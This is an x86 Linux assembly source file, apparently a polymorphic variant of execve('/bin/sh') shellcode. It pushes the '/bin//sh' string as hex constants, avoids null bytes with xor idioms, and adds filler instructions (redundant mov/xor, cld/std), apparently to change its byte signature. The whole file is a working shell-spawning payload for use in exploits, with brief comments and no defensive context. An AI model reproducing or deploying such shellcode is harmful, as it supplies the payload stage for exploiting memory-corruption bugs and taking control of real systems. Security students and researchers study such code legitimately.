global _start

section .text
_start:
    ; edx - envp
    mov eax, edx
		xor eax, edx

    mov DWORD [esp-4], edx
		sub esp, 0x4

    mov edx, esp

		cld

    ; Prepare ecx (argv) for later
    xor ecx, ecx
    push ecx
    mov ecx, esp

    ; Prepare ebx - (pathname)
    xor ebx, ebx
    push ebx

    ; push the string into the stack
    ; "/bin//sh" - Extra slash to make it align
    ; with boundary of 4.
    push 0x68732f2f
    push 0x6e69622f

    mov ebx, esp

		std

    ; Finalize ecx
    mov DWORD [ecx], ebx

    ; Prepare eax - 11 (execve)
    xor eax, eax
    mov al, 0xB

    ; System Call
    int 0x80